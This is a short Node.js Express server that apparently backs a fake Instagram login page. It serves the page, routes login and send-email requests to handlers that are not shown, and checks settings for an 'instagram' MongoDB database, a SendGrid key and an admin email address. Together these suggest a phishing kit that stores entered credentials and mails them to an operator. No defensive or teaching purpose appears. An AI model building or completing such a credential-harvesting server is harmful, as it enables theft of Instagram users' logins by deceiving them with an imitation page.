const express = require('express');
const path = require('path');
const app = express();
const port = 3000;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Import API functions
const loginHandler = require('./api/login');
const emailHandler = require('./api/send-email');

// API Routes
app.post('/api/login', loginHandler);
app.post('/api/send-email', emailHandler);

// Serve static files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(port, () => {
    console.log(`🚀 Local server running at http://localhost:${port}`);
    console.log(`📱 Instagram login page: http://localhost:${port}`);
    console.log(`🔧 API endpoints:`);
    console.log(`   POST /api/login`);
    console.log(`   POST /api/send-email`);
    console.log(`\n⚠️  Environment variables:`);
    console.log(`   MONGODB_URI: ${process.env.MONGODB_URI ? '✅ Set' : '❌ Not set'}`);
    console.log(`   MONGODB_DB: ${process.env.MONGODB_DB || 'instagram'}`);
    console.log(`   MONGODB_COLLECTION: ${process.env.MONGODB_COLLECTION || 'user'}`);
    console.log(`   SENDGRID_API_KEY: ${process.env.SENDGRID_API_KEY ? '✅ Set' : '❌ Not set'}`);
    console.log(`   ADMIN_EMAIL: ${process.env.ADMIN_EMAIL || '❌ Not set'}`);
});
